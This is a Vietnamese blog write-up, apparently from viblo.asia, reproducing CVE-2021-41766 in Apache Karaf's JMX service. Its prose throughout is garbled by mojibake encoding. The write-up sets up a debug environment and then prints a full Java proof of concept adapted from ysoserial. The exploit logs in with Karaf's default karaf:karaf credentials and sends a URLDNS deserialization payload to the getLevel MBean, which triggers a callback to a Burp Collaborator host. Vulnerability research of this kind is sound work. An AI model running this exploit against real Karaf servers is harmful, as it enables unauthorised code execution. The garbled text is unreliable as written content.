XÃ©t á»Ÿ gÃ³c Ä‘á»™ cÃ¡ch khai thÃ¡c cá»§a CVE nÃ y thÃ¬ Ä‘Ã¢y khÃ´ng pháº£i lÃ  má»™t CVE thÃº vá»‹ vÃ  Ä‘Ã¡ng Ä‘Æ°á»£c lÆ°u tÃ¢m. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh nghiÃªn cá»©u CVE nÃ y, mÃ¬nh gáº·p khÃ¡ nhiá»u khÃ³ khÄƒn Ä‘á»ƒ tÃ¡i hiá»‡n vÃ  phÃ¢n tÃ­ch lá»—i nÃ y. TÃ­nh tá»›i thá»i Ä‘iá»ƒm viáº¿t bÃ i thÃ¬ chÆ°a cÃ³ PoC cho CVE-2021-41766, cÅ©ng nhÆ° bÃ i phÃ¢n tÃ­ch vá» CVE nÃ y, nÃªn cÃ³ thá»ƒ coi Ä‘Ã¢y lÃ  bÃ i phÃ¢n tÃ­ch 1-day (Ä‘áº§u tiÃªn) cá»§a mÃ¬nh :D 
# 0x01 Tá»•ng quan vá» CVE-2021-41766
Theo nhÆ° mÃ´ táº£ trÃªn cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a NIST vá» [CVE-2021-41766](https://nvd.nist.gov/vuln/detail/CVE-2021-41766), CVE nÃ y liÃªn quan tá»›i Java Management Extension (JMX). VÃ¬ váº­y, trÆ°á»›c khi Ä‘i sÃ¢u hÆ¡n vÃ o CVE nÃ y, cÃ¡c báº¡n nÃªn tÃ¬m hiá»ƒu thÃªm vá» JMX vÃ  MBean service ná»¯a nhÃ©. MÃ¬nh sáº½ Ä‘á»ƒ cÃ¡c link mÃ¬nh Ä‘Ã£ dÃ¹ng Ä‘á»ƒ tÃ¬m hiá»ƒu á»Ÿ cuá»‘i bÃ i.

ThÃ´ng tin máº¥u chá»‘t giÃºp mÃ¬nh tÃ¡i táº¡o PoC cho CVE nÃ y lÃ 
> Whereas the default JMX implementation is hardened against unauthenticated deserialization attacks, the implementation used by Apache Karaf is not protected against this kind of attack. 

NhÆ° váº­y, mÃ¬nh cÃ³ thá»ƒ rÃºt ra máº¥y Ã½ nhÆ° sau:
* TrÆ°á»›c Ä‘Ã³, cÃ³ triá»ƒn khai JMX máº·c Ä‘á»‹nh (default JMX implementation) tá»«ng bá»‹ táº¥n cÃ´ng bá»Ÿi má»™t ká»¹ thuáº­t X, dáº«n tá»›i bá»‹ khai thÃ¡c lá»— há»•ng unauthenticated deserialization. Default JMX implementation Ä‘Ã£ vÃ¡ lá»—i nÃ y.
* Tuy nhiÃªn, khi Apache Karaf triá»ƒn khai JMX, Apache Karaf khÃ´ng Ã¡p dá»¥ng cÃ¡c cÆ¡ cháº¿ Ä‘á»ƒ vÃ¡ lá»—i trÃªn, dáº«n tá»›i pháº§n triá»ƒn khai JMX cá»§a Apache Karaf cÃ³ thá»ƒ bá»‹ táº¥n cÃ´ng bá»Ÿi ká»¹ thuáº­t X. Äiá»u Ä‘Ã³ nghÄ©a lÃ , náº¿u mÃ¬nh tÃ¬m Ä‘Æ°á»£c ká»¹ thuáº­t X Ä‘Ã£ tá»«ng dÃ¹ng Ä‘á»ƒ khai thÃ¡c cÆ¡ cháº¿ triá»ƒn khai JMX máº·c Ä‘á»‹nh, thÃ¬ mÃ¬nh cÅ©ng cÃ³ thá»ƒ khai thÃ¡c triá»ƒn khai JMX cá»§a Apache Karaf vá»›i cÆ¡ cháº¿ tÆ°Æ¡ng tá»±!

(VÃ  báº±ng má»™t phÃ©p mÃ u nÃ o Ä‘Ã³ mÃ¬nh máº¥t gáº§n 1 tuáº§n má»›i Ä‘á»ƒ Ã½ Ä‘áº¿n Ä‘oáº¡n nÃ y ğŸ˜­)
# 0x02 Dá»±ng mÃ´i trÆ°á»ng debug cho Apache Karaf
Thá»±c sá»± Ä‘áº¿n giá» mÃ¬nh váº«n chÆ°a hiá»ƒu rÃµ Apache Karaf lÃ  gÃ¬, nÃªn mÃ¬nh sáº½ chá»‰ viáº¿t láº¡i quÃ¡ trÃ¬nh dá»±ng mÃ´i trÆ°á»ng debug nhÆ° nÃ o thÃ´i Ä‘Ã£ váº­y.

Theo nhÆ° Apache Karaf [Advisory](https://karaf.apache.org/security/cve-2021-41766.txt) cho CVE-2021-41766, cÃ¡c phiÃªn báº£n trÆ°á»›c 4.3.6 sáº½ bá»‹ áº£nh hÆ°á»Ÿng bá»Ÿi lá»—i nÃ y. VÃ¬ váº­y, mÃ¬nh táº£i Apache Karaf phiÃªn báº£n 4.3.5 Ä‘á»ƒ dá»±ng mÃ´i trÆ°á»ng debug. Source code cá»§a Apache Karaf mÃ¬nh download trÃªn github https://github.com/apache/karaf/releases/tag/karaf-4.3.5

LÃ m theo [hÆ°á»›ng dáº«n](https://blog.csdn.net/mn960mn/article/details/47810981) cá»§a Xixia Yipintang, mÃ¬nh má»Ÿ file `bin\karaf.bat` lÃªn vÃ  thÃªm dÃ²ng `set KARAF_DEBUG=true`
![image.png](https://images.viblo.asia/cd276237-496e-4d3e-b9e6-2427cc431c5e.png)

Cháº¡y file `bin\karaf.bat`. Äá»ƒ Ã½ Apache Karaf nháº­n káº¿t ná»‘i cho debug tá»« xa thÃ´ng qua cá»•ng 5005
![image.png](https://images.viblo.asia/4470a96b-2629-4945-8536-a5fd4e14bfae.png)

Äá»ƒ debug Apache Karaf tá»« xa, mÃ¬nh dÃ¹ng Remote JVM Debug cá»§a InteliJ IDEA. Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh cá»§a Remote JVM Debug (mÃ¬nh Ä‘áº·t tÃªn lÃ  remoteDebug) Ä‘Ã£ káº¿t ná»‘i tá»›i cá»•ng 5005, vÃ¬ váº­y mÃ¬nh Ä‘á»ƒ nguyÃªn.
![image.png](https://images.viblo.asia/08e8064c-9fca-409a-824f-6a6f62991e1e.png)

Cháº¡y remoteDebug trong IDEA. Náº¿u hiá»‡n thÃ´ng bÃ¡o káº¿t ná»‘i nhÆ° hÃ¬nh dÆ°á»›i dÃ¢y tá»©c lÃ  Ä‘Ã£ set up debug cho Apache Karaf thÃ nh cÃ´ng
![image.png](https://images.viblo.asia/7bbd5818-2db8-411d-ab85-66440eb81e54.png)

# 0x03 PhÃ¢n tÃ­ch lá»— há»•ng
NhÆ° Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ pháº§n 1, mÃ¬nh báº¯t Ä‘áº§u Ä‘i tÃ¬m hiá»ƒu cÃ¡c cÃ¡ch khai thÃ¡c JMX Implementation vÃ  tÃ¬m tháº¥y má»™t bÃ i khÃ¡ chi tiáº¿t https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/. CÃ¡c báº¡n cÃ³ thá»ƒ tá»± Ä‘á»c má»¥c **Deserialization on the JMX/MBean level** rá»“i tá»± phÃ¢n tÃ­ch lá»— há»•ng nÃ y nhÃ©.

CÃ³ thá»ƒ má»™t ngÃ y Ä‘áº¹p trá»i nÃ o Ä‘Ã³ (sau khi viáº¿t xong Ä‘á»“ Ã¡n) thÃ¬ mÃ¬nh sáº½ quay láº¡i Ä‘á»ƒ bá»• sung ná»‘t pháº§n nÃ y.
# 0x04 TÃ¡i hiá»‡n lá»— há»•ng
CÃ¡ch khai thÃ¡c lá»— há»•ng nÃ y Ä‘Ã£ Ä‘Æ°á»£c commit á»Ÿ `ysoserial/exploit/JMXInvokeMBean.java`. Äá»ƒ Ä‘Æ¡n giáº£n quÃ¡ trÃ¬nh khai thÃ¡c, mÃ¬nh má»Ÿ nguyÃªn `ysoserial` project trong IDEA, rá»“i sá»­a láº¡i file `JMXInvokeMBean.java` Ä‘á»ƒ khai thÃ¡c CVE-2021-41766.

## Káº¿t ná»‘i Ä‘áº¿n Apache Karaf server

Äá»ƒ sá»­ dá»¥ng `JMXInvokeMBean`, mÃ¬nh cáº§n 4 Ä‘á»‘i sá»‘
* `host`: Ä‘á»‹a chá»‰ mÃ¡y chá»§ Apache Karaf. á» Ä‘Ã¢y, mÃ¬nh tÃ¡i hiá»‡n lá»— há»•ng trÃªn localhost nÃªn `host` cÅ©ng lÃ  `localhost`.
* `port`: cá»•ng JMX RMI service cá»§a mÃ¡y chá»§ Apache Karaf. Cá»•ng dá»‹ch vá»¥ máº·c Ä‘á»‹nh cá»§a RMI luÃ´n lÃ  `1099`
* `payload_type`: tÃªn loáº¡i ysoserial payload dÃ¹ng Ä‘á»ƒ khai thÃ¡c lá»— há»•ng deserialization. Trong bÃ i nÃ y, mÃ¬nh sá»­ dá»¥ng URLDNS payload
* `payload_arg`: cÃ¡c Ä‘á»‘i sá»‘ (argument) cá»§a loáº¡i ysoserial payload tÆ°Æ¡ng á»©ng. á» Ä‘Ã¢y mÃ¬nh láº¥y URL cá»§a Burp Collaborator Client.

CÃ¡c thÃ´ng tin vá» `host `vÃ  `port` sáº½ Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ khá»Ÿi táº¡o má»™t `JMXServiceURL`. `serviceUrl` cá»§a Apache Karaf Ä‘Æ°á»£c cáº¥u hÃ¬nh á»Ÿ file `etc/org.apache.karaf.management.cfg`, cÃ³ giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  `service:jmx:rmi:///jndi/rmi://localhost:1099/karaf-root`. 

Tuy nhiÃªn, khi mÃ¬nh thá»­ connect tá»›i Apache Karaf server thÃ¬ chÆ°Æ¡ng trÃ¬nh bÃ¡o lá»—i vá» yÃªu cáº§u thÃªm credentials. Credentials cá»§a Apache Karaf Ä‘Æ°á»£c lÆ°u á»Ÿ file `etc/users.properties`, cÃ³ giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  `karaf:karaf`.

Vá»›i táº¥t cáº£ cÃ¡c thÃ´ng tin trÃªn, mÃ¬nh cÃ³ thá»ƒ sá»­a code trong `JMXInvokeMBean.java` Ä‘á»ƒ káº¿t ná»‘i Ä‘áº¿n JMX RMI service cá»§a Apache Karaf server. Äoáº¡n code mÃ¬nh sá»­a cÃ¡c thÃ´ng tin liÃªn quan Ä‘á»ƒ káº¿t ná»‘i tá»›i Apache Karaf nhÆ° sau:
```java
args = new String[4];
args[0] = "localhost";
args[1] = "1099";
args[2] = "URLDNS";
args[3] = "http://8x6r511e351r0z6px6oavfxdu40vok.burpcollaborator.net";

HashMap environment = new HashMap();
String[] credentials = new String[] {"karaf", "karaf"};
environment.put (JMXConnector.CREDENTIALS, credentials);

JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/karaf-root");

JMXConnector jmxConnector = JMXConnectorFactory.connect(url, environment);
MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();
```

## Khai thÃ¡c JMX RMI service cá»§a Apache Karaf: `getLevel`

Apache Karaf cÃ³ 1 JMX service khÃ¡ giá»‘ng vá»›i `getLoggingLevel` cá»§a JMX service máº·c Ä‘á»‹nh lÃ  `getLevel`. Má»Ÿ `jconsole` lÃªn vÃ o connect vÃ o Apache Karaf, mÃ¬nh cÃ³ thá»ƒ tháº¥y hÃ m nÃ y cÅ©ng nháº­n argument kiá»ƒu `String` vÃ  cÅ©ng tráº£ vá» log level.
![image.png](https://images.viblo.asia/42a03850-23e6-4c73-86a2-fc22e9b56cbc.png)

![image.png](https://images.viblo.asia/b4b763f5-2cd6-42b8-a2ff-40c3d3d3198a.png)

Äáº¿n Ä‘oáº¡n nÃ y, mÃ¬nh gáº§n nhÆ° lÃ  sáº½ mÃ´ phá»ng (nÃ³i dÃ¢n dÃ£ thÃ¬ gá»i lÃ  báº¯t chÆ°á»›c) cÃ¡ch khai thÃ¡c `getLoggingLevel` cá»§a JMX máº·c Ä‘á»‹nh. Má»™t cÃ¡ch dá»… dÃ ng, mÃ¬nh cÃ³ Ä‘Æ°á»£c cÃ¡c thÃ´ng tin cá»§a (MBean) service nÃ y nhÆ° sau:

* (MBean) service name: `org.apache.karaf:type=log,name=root`
* Operation name: `getLevel`

Vá»›i cÃ¡c thÃ´ng tin trÃªn, mÃ¬nh sá»­a ná»‘t pháº§n code Ä‘á»ƒ gá»­i malicious object tá»›i Apache Karaf trong `JMXInvokeMBean.java` nhÆ° sau:
```java
// create the payload
Object payloadObject = Utils.makePayloadObject(args[2], args[3]);   
ObjectName mbeanName = new ObjectName("org.apache.karaf:type=log,name=root");

mbeanServerConnection.invoke(mbeanName, "getLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});
```

## CVE-2021-41766 PoC
Sau khi sá»­a code nhÆ° 2 pháº§n trÃªn, mÃ¬nh cÃ³ Ä‘Æ°á»£c file PoC cá»§a CVE-2021-41766 nhÆ° sau:
```java
public class JMXInvokeMBean {

	public static void main(String[] args) throws Exception {
	
//		if ( args.length < 4 ) {
//			System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_arg>");
//			System.exit(-1);
//		}
		args = new String[4];
		args[0] = "localhost";
		args[1] = "1099";
		args[2] = "URLDNS";
		args[3] = "http://8x6r511e351r0z6px6oavfxdu40vok.burpcollaborator.net";

		HashMap environment = new HashMap();
		String[] credentials = new String[] {"karaf", "karaf"};
		environment.put (JMXConnector.CREDENTIALS, credentials);

		JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/karaf-root");

		JMXConnector jmxConnector = JMXConnectorFactory.connect(url, environment);
		MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

		// create the payload
		Object payloadObject = Utils.makePayloadObject(args[2], args[3]);   
		ObjectName mbeanName = new ObjectName("org.apache.karaf:type=log,name=root");

		mbeanServerConnection.invoke(mbeanName, "getLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

		//close the connection
		jmxConnector.close();
    }
}
```
Sau khi cháº¡y file PoC, Burp Collborator Client log Ä‘Æ°á»£c 1 lookup request, cho tháº¥y lá»— há»•ng java deserialization Ä‘Ã£ bá»‹ khai thÃ¡c thÃ nh cÃ´ng
![image.png](https://images.viblo.asia/42ef7ff9-ecb6-4367-b839-85249489043a.png)
# 0x05 Káº¿t luáº­n
Tuy Ä‘Ã¢y lÃ  1 CVE sá»­ dá»¥ng cÆ¡ cháº¿ khai thÃ¡c cÅ© nhÆ°ng Ä‘á»ƒ tÃ¡i hiá»‡n CVE nÃ y Ä‘Ã²i há»i khÃ¡ nhiá»u kiáº¿n thá»©c má»›i láº¡ (Ã­t nháº¥t lÃ  Ä‘á»‘i vá»›i mÃ¬nh). Ká»ƒ ra bÃ i nÃ y mÃ¬nh cÅ©ng khÃ´ng pháº£i tá»± viáº¿t PoC mÃ  chá»‰ sá»­a láº¡i máº¥y cÃ¡i PoC cÅ© cho khá»›p nÃªn khÃ´ng háº³n lÃ  1 bÃ i 1-day hoÃ n chá»‰nh. Mong lÃ  sÃ¡p tá»›i mÃ¬nh cÃ³ thá»ƒ viáº¿t nhá»¯ng bÃ i phÃ¢n tÃ­ch 1-day theo Ä‘Ãºng nghÄ©a cá»§a nÃ³ :D

# Nguá»“n tham kháº£o
1. https://www.baeldung.com/java-management-extensions
2. https://subscription.packtpub.com/book/application-development/9781783985081/1/ch01lvl1sec13/using-jmx-to-monitor-and-administer-apache-karaf
3. https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/
4. https://www.google.com/url?q=https://blog.csdn.net/mn960mn/article/details/47810981&sa=D&source=editors&ust=1651227249040661&usg=AOvVaw3QOSNDG0bA3H79fYAmVLdq